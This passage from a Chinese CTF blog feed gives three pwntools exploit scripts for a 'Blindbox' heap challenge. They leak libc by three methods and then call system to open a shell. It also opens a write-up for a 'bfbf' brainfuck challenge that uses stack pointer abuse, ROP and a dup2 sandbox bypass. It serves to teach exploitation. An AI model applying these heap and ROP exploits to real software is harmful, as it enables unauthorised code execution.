class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;第一种方法</span><br><span class="hljs-string">    仅获取small bin的低5字节数据，从而获取libc 基地址</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">s,i</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(s))<br>    p.sendlineafter(<span class="hljs-string">&#x27;(1-3): &#x27;</span>,<span class="hljs-built_in">str</span>(i))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">i</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;drop?&#x27;</span>,<span class="hljs-built_in">str</span>(i))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">i</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;open?&#x27;</span>,<span class="hljs-built_in">str</span>(i))<br>    p.readuntil(<span class="hljs-string">&#x27;Blindbox: &#x27;</span>)<br>    <span class="hljs-keyword">return</span> u64(p.read(<span class="hljs-number">8</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">i,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;change?&#x27;</span>,<span class="hljs-built_in">str</span>(i))<br>    p.sendafter(<span class="hljs-string">&#x27;content:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;wish&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pay</span>(<span class="hljs-params">system</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">1804289383</span>, <span class="hljs-number">846930886</span>, <span class="hljs-number">1681692777</span>, <span class="hljs-number">1714636915</span>, <span class="hljs-number">1957747793</span>, <span class="hljs-number">424238335</span>, <span class="hljs-number">719885386</span>, <span class="hljs-number">1649760492</span>]:<br>        p.sendlineafter(<span class="hljs-string">&#x27;guess&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(i^system))<br><br>fake_heap=<span class="hljs-number">0x66666000</span>   <br>libc=ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>p=process(<span class="hljs-string">&#x27;./Blindbox&#x27;</span>)<br>gdb.attach(p)<br>p.sendlineafter(<span class="hljs-string">&#x27;name:&#x27;</span>,p64(<span class="hljs-number">0</span>)+p64(fake_heap-<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;number?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x98</span>))<br>p.sendlineafter(<span class="hljs-string">&#x27;number?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0xb8</span>))<br>p.sendlineafter(<span class="hljs-string">&#x27;number?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x158</span>))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>    free(<span class="hljs-number">1</span>)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br>    free(<span class="hljs-number">2</span>)<br>    add(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>)<br>    free(<span class="hljs-number">3</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br>    free(<span class="hljs-number">2</span>)<br>    add(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>)<br>    free(<span class="hljs-number">3</span>)<br><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br><br>edit(<span class="hljs-number">2</span>,p64(fake_heap-<span class="hljs-number">0x10</span>)*<span class="hljs-number">2</span>)<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br><br>payload=p64(<span class="hljs-number">2</span>)+p64(<span class="hljs-number">0</span>)+p64(fake_heap+<span class="hljs-number">0x20</span>) <br>  <span class="hljs-comment"># 这里必须为 p64(2)+p64(0)</span><br>  <span class="hljs-comment"># 主要是为了伪造chunk为由 mmap创建的chunk，防止calloc在获取chunk时修改了后面的数据</span><br>payload=payload.ljust(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(fake_heap-<span class="hljs-number">0x8</span>)+p64(fake_heap+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>-<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">0</span>)<br>make(payload)<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>d=show(<span class="hljs-number">1</span>)<br>d=(d&gt;&gt;<span class="hljs-number">24</span>)|(<span class="hljs-number">0x7f</span>&lt;&lt;<span class="hljs-number">40</span>)<br>malloc_hook=d-<span class="hljs-number">0x10</span>-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x90</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>pay(system)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;第二种方法</span><br><span class="hljs-string">    通过修改_IO_2_1_stdout_ 在输出时泄露libc 地址</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">s,i</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(s))<br>    p.sendlineafter(<span class="hljs-string">&#x27;(1-3): &#x27;</span>,<span class="hljs-built_in">str</span>(i))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">i</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;drop?&#x27;</span>,<span class="hljs-built_in">str</span>(i))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">i</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;open?&#x27;</span>,<span class="hljs-built_in">str</span>(i))<br>    p.readuntil(<span class="hljs-string">&#x27;Blindbox: &#x27;</span>)<br>    <span class="hljs-keyword">return</span> u64(p.read(<span class="hljs-number">8</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">i,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;change?&#x27;</span>,<span class="hljs-built_in">str</span>(i))<br>    p.sendafter(<span class="hljs-string">&#x27;content:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;wish: &#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pay</span>(<span class="hljs-params">system</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">1804289383</span>, <span class="hljs-number">846930886</span>, <span class="hljs-number">1681692777</span>, <span class="hljs-number">1714636915</span>, <span class="hljs-number">1957747793</span>, <span class="hljs-number">424238335</span>, <span class="hljs-number">719885386</span>, <span class="hljs-number">1649760492</span>]:<br>        p.sendlineafter(<span class="hljs-string">&#x27;guess&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(i^system))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    fake_heap=<span class="hljs-number">0x66666000</span>   <br>    libc=ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;name:&#x27;</span>,p64(<span class="hljs-number">0</span>)+p64(fake_heap-<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;number?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x98</span>))<br>    p.sendlineafter(<span class="hljs-string">&#x27;number?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0xb8</span>))<br>    p.sendlineafter(<span class="hljs-string">&#x27;number?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x158</span>))<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>        free(<span class="hljs-number">1</span>)<br>        add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br>        free(<span class="hljs-number">2</span>)<br>        add(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>)<br>        free(<span class="hljs-number">3</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br>        free(<span class="hljs-number">2</span>)<br>        add(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>)<br>        free(<span class="hljs-number">3</span>)<br><br>    add(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br>    free(<span class="hljs-number">3</span>)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br><br>    add(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br>    free(<span class="hljs-number">3</span>)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br><br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br>    free(<span class="hljs-number">2</span>)<br>    free(<span class="hljs-number">1</span>)<br>    add(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br>    free(<span class="hljs-number">3</span>)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br>    n=<span class="hljs-number">0x8690</span><br>    edit(<span class="hljs-number">2</span>,p64(fake_heap-<span class="hljs-number">0x10</span>)+p16(n))<br><br>    add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment">#pause()</span><br>    fake_IO=p64(<span class="hljs-number">0xfbad1887</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p16(n+<span class="hljs-number">8</span>)<br><br>    make(fake_IO)<br><br>    d=u64(p.read(<span class="hljs-number">8</span>))<br>    <span class="hljs-keyword">if</span> d&gt;&gt;<span class="hljs-number">40</span> &lt;<span class="hljs-number">0x7f</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-number">123</span>)<br>        <span class="hljs-keyword">return</span><br>    libc.address=d-libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>    system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    pay(system)<br>    p.interactive()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        p=process(<span class="hljs-string">&#x27;./Blindbox&#x27;</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br>    p.close()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;第三种方法</span><br><span class="hljs-string">   程序在输出chunk时，仅检测了chunk的fd字段处是否存在值为0x7f的字节，</span><br><span class="hljs-string">                   并未检测是否存在值为0x7e的字节</span><br><span class="hljs-string">   而在某些情况下libc的地址就在0x7exxxxxxxxxx处，</span><br><span class="hljs-string">   通过多次尝试，只要libc基地址在0x7exxxxxxxxxx处就可以获取shell</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">s,i</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(s))<br>    p.sendlineafter(<span class="hljs-string">&#x27;(1-3): &#x27;</span>,<span class="hljs-built_in">str</span>(i))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">i</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;drop?&#x27;</span>,<span class="hljs-built_in">str</span>(i))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">i</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;open?&#x27;</span>,<span class="hljs-built_in">str</span>(i))<br>    p.readuntil(<span class="hljs-string">&#x27;Blindbox: &#x27;</span>,timeout=<span class="hljs-number">0.1</span>)<br>    <span class="hljs-keyword">return</span> u64(p.read(<span class="hljs-number">8</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">i,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;change?&#x27;</span>,<span class="hljs-built_in">str</span>(i))<br>    p.sendafter(<span class="hljs-string">&#x27;content:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;wish: &#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pay</span>(<span class="hljs-params">system</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">1804289383</span>, <span class="hljs-number">846930886</span>, <span class="hljs-number">1681692777</span>, <span class="hljs-number">1714636915</span>, <span class="hljs-number">1957747793</span>, <span class="hljs-number">424238335</span>, <span class="hljs-number">719885386</span>, <span class="hljs-number">1649760492</span>]:<br>        p.sendlineafter(<span class="hljs-string">&#x27;guess&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(i^system))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    fake_heap=<span class="hljs-number">0x66666000</span>   <br>    libc=ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;name:&#x27;</span>,p64(<span class="hljs-number">0</span>)+p64(fake_heap-<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;number?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x98</span>))<br>    p.sendlineafter(<span class="hljs-string">&#x27;number?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0xb8</span>))<br>    p.sendlineafter(<span class="hljs-string">&#x27;number?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x158</span>))<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>        free(<span class="hljs-number">1</span>)<br>    add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>    add(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br>    free(<span class="hljs-number">1</span>)<br>    d=show(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> ((d&gt;&gt;<span class="hljs-number">40</span>)&amp;<span class="hljs-number">0xff</span>) != <span class="hljs-number">0x7e</span>:<br>        <span class="hljs-keyword">return</span><br>    d=d-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span><br>    libc.address=d-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    pay(system)<br>    p.interactive()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        p=process(<span class="hljs-string">&#x27;./Blindbox&#x27;</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br>    p.close()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第五届强网拟态挑战赛预赛-pwn</title>
    <link href="/page/wp/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn/"/>
    <url>/page/wp/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn/</url>
    
    <content type="html"><![CDATA[<h2 id="bfbf">bfbf</h2><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-bfbf.jpg" srcset="/img/loading.gif" lazyload alt="bfbf_parse函数代码" title="bfbf_parse函数代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-bfbf-1.jpg" srcset="/img/loading.gif" lazyload alt="run_bfbf函数代码" title="run_bfbf函数代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-bfbf-2.jpg" srcset="/img/loading.gif" lazyload alt="读取brainfuck代码处代码" title="读取brainfuck代码处代码"></p><p>通过run_bfbf函数中看到，brain fuck的指针指向的地址位于栈中，且没有限制偏移大小，所以可以利用 <code>&lt;</code>,<code>&gt;</code>或<code>[]</code>将指针偏移到指定位置泄露<code>run_bfbf的返回地址</code>，<code>__libc_start_main函数地址</code>,并且可以控制返回地址，构造<code>rop</code></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-bfbf-3.jpg" srcset="/img/loading.gif" lazyload alt=""></p><p>程序中开启了沙盒,当程序执行过程中从非<code>0</code>或<code>1</code>句柄中读取数据,就退出程序,这让我们不能通过执行<code>/bin/sh</code>获取设立了,且不能直接使用<code>orw</code>读取flag文件,不过可以通过<code>dup2</code>将<code>open(&quot;flag&quot;)</code>开启的3句柄，转移到<code>0</code>句柄上,这样就可以获取flag了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 